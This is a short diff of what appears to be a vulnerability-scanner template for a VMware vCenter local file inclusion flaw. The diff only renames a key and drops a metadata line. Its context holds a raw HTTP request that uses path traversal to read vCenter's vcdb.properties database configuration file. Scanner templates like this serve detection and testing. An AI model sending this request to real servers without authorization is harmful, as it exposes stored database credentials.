@@ -13,10 +13,8 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: vmware,lfi,vcenter
-  metadata:
-    max-request: 3
 
-http:
+requests:
   - raw:
       - |
         GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
